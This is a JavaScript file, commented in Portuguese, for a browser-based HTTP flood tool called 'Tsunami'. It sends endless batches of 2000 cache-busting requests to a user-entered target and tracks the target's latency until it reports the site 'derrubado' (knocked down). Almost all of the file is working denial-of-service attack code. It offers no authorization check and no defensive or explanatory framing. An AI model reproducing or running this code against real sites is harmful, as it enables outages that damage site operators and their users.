let ativo = false;
let requisicoesNoSegundo = 0;
let totalAcumulado = 0;
let segundosPassados = 0;
let intervaloTempo;
let intervaloSaude; // Novo controle para o monitor de saúde

function log(msg) {
    const logBox = document.getElementById('log');
    logBox.innerHTML += `<br>> ${msg}`;
    logBox.scrollTop = logBox.scrollHeight;
}

function formatarTempo(s) {
    const min = Math.floor(s / 60).toString().padStart(2, '0');
    const seg = (s % 60).toString().padStart(2, '0');
    return `${min}:${seg}`;
}

// Nova função para monitorar se o site está lento ou caiu
async function checarSaudeAlvo(url) {
    if (!ativo) return;

    const inicio = Date.now();
    const painel = document.getElementById('panel');

    try {
        // Requisição de teste separada da inundação
        await fetch(`${url}?pulse=${Math.random()}`, { mode: 'no-cors', cache: 'no-store' });
        const latencia = Date.now() - inicio;
        
        document.getElementById('latency').innerHTML = latencia + "ms";

        if (latencia > 1000 && latencia < 3000) {
            // ALERTA AMARELO: Site lento
            painel.style.borderColor = "#ffff00";
            painel.style.boxShadow = "0 0 25px #ffff00";
            log("<span style='color: #ffff00'>[AVISO]: Latência alta detectada!</span>");
        } else if (latencia >= 3000) {
            // ALERTA VERMELHO: Site quase parando
            painel.style.borderColor = "#ff0000";
            painel.style.boxShadow = "0 0 25px #ff0000";
            log("<span class='warning'>[ESTRESSE]: Alvo com extrema dificuldade!</span>");
        } else {
            // VERDE/CIANO: Site normal
            painel.style.borderColor = "#ffd700";
            painel.style.boxShadow = "0 0 15px #00ffff";
        }
    } catch (e) {
        // CRÍTICO: Site não respondeu
        painel.style.borderColor = "#ff0000";
        document.getElementById('latency').innerHTML = "OFFLINE";
        log("<span class='warning'>[CRÍTICO]: ALVO DERRUBADO OU BLOQUEADO!</span>");
    }
}

async function toggleTsunami() {
    const alvo = document.getElementById('target').value;
    const btn = document.getElementById('btn-main');

    if (!alvo) {
        log("<span class='warning'>ERRO: Alvo não definido!</span>");
        return;
    }

    ativo = !ativo;

    if (ativo) {
        totalAcumulado = 0;
        segundosPassados = 0;
        document.getElementById('total-hits').innerHTML = "0";
        document.getElementById('timer').innerHTML = "00:00";
        
        btn.innerHTML = "Parar Onda";
        btn.style.background = "#ff0000";
        document.getElementById('engine-status').innerHTML = "RUNNING";
        document.getElementById('engine-status').style.color = "#ff0000";
        
        log(`ALVO TRAVADO: ${alvo}`);
        log("INICIANDO MONITOR DE SAÚDE...");
        
        // Inicia cronômetro e contador de RPS
        intervaloTempo = setInterval(() => {
            segundosPassados++;
            document.getElementById('timer').innerHTML = formatarTempo(segundosPassados);
            document.getElementById('rps').innerHTML = requisicoesNoSegundo;
            requisicoesNoSegundo = 0;
            
            // A cada 5 segundos, faz o teste de pulso
            if (segundosPassados % 5 === 0) {
                checarSaudeAlvo(alvo);
            }
        }, 1000);

        inundar(alvo);
    } else {
        btn.innerHTML = "Iniciar Onda";
        btn.style.background = "#00ffff";
        document.getElementById('engine-status').innerHTML = "IDLE";
        document.getElementById('engine-status').style.color = "#00ffff";
        
        // Reset visual do painel
        const painel = document.getElementById('panel');
        painel.style.borderColor = "#ffd700";
        painel.style.boxShadow = "0 0 15px #00ffff";
        
        clearInterval(intervaloTempo);
        log("ONDA ENCERRADA.");
    }
}

async function inundar(url) {
    while (ativo) {
        const lote = 2000; // Potência máxima configurada
        const disparos = Array.from({ length: lote }, () => 
            fetch(`${url}?t=${Math.random()}`, { mode: 'no-cors', cache: 'no-store' })
                .then(() => { 
                    requisicoesNoSegundo++; 
                    totalAcumulado++; 
                    document.getElementById('total-hits').innerHTML = totalAcumulado;
                })
                .catch(() => { 
                    requisicoesNoSegundo++; 
                    totalAcumulado++; 
                    document.getElementById('total-hits').innerHTML = totalAcumulado;
                })
        );

        await Promise.allSettled(disparos);
        await new Promise(r => setTimeout(r, 10)); 
    }
}
